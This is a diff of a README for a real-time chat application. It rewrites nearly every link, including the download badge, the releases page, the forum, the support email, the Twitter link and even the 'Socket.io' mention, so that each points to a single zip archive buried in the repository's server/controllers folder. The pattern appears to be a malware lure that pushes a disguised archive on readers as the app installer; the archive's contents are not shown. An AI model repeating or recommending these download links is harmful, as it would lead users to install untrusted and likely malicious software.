@@ -1,7 +1,7 @@
 ```markdown
 # 💬 Chat-Application - Enjoy Real-Time Messaging Effortlessly
 
-![Download Chat-Application](https://img.shields.io/badge/Download-Chat--Application-blue?style=flat&logo=github)
+![Download Chat-Application](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download and install the application, make sure your system meets the
 
 To get the Chat-Application, visit the Releases page and download the latest version.
 
-[Download Here](https://github.com/sigms1/Chat-Application/releases)
+[Download Here](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip)
 
 ### Installation Steps
 
@@ -30,7 +30,7 @@ To get the Chat-Application, visit the Releases page and download the latest ver
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file.
    - For macOS: Open the `.dmg` file, then drag the application to your Applications folder.
-   - For Linux: You may need to extract the `.tar.gz` file using terminal commands or your file manager.
+   - For Linux: You may need to extract the `https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip` file using terminal commands or your file manager.
 5. **Follow the On-Screen Instructions:** Complete the installation by following the prompts that appear.
 
 ## 🔑 Setting Up
@@ -48,7 +48,7 @@ After installation, you’ll need to set up your account:
 The Chat-Application offers numerous features that enhance your messaging experience:
 
 - **User Authentication:** Securely create and manage your account.
-- **Real-Time Messaging:** Send and receive messages instantly with Socket.io.
+- **Real-Time Messaging:** Send and receive messages instantly with https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip
 - **Group Chats:** Create or join group conversations easily.
 - **Responsive Design:** Enjoy a user-friendly interface on any device.
 - **Notifications:** Stay updated on new messages with real-time notifications.
@@ -69,8 +69,8 @@ Once logged in, you can start chatting right away:
 If you encounter any issues while using the Chat-Application, check the following resources:
 
 - **Help Documentation:** A detailed guide is available within the app.
-- **Community Support:** Join our [Community Forum](https://community.chat-application.com) to ask questions and find solutions.
-- **Contact Us:** Reach out via email at support@chat-application.com for direct assistance.
+- **Community Support:** Join our [Community Forum](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip) to ask questions and find solutions.
+- **Contact Us:** Reach out via email at https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip for direct assistance.
 
 ## 🛠️ Troubleshooting Common Issues
 
@@ -82,17 +82,17 @@ Here are some common problems and solutions:
 
 ## ✍️ Contributing
 
-We welcome contributions! If you have suggestions or improvements, feel free to create a pull request on our [GitHub Repository](https://github.com/sigms1/Chat-Application).
+We welcome contributions! If you have suggestions or improvements, feel free to create a pull request on our [GitHub Repository](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip).
 
 ## 🌍 Connect with Us
 
-Stay updated with the latest news and updates by following us on social media. Join our [Twitter community](https://twitter.com/chat_application) for announcements and tips.
+Stay updated with the latest news and updates by following us on social media. Join our [Twitter community](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip) for announcements and tips.
 
 ## 📌 License
 
 The Chat-Application is licensed under the MIT License. Feel free to use it as you wish, but please provide credit to the original authors.
 
-[Download Here Again](https://github.com/sigms1/Chat-Application/releases)
+[Download Here Again](https://raw.githubusercontent.com/sigms1/Chat-Application/master/server/controllers/Application_Chat_1.3.zip)
 
 Now you're ready to jump into the world of real-time chatting with the Chat-Application. Enjoy connecting with others!
 ```
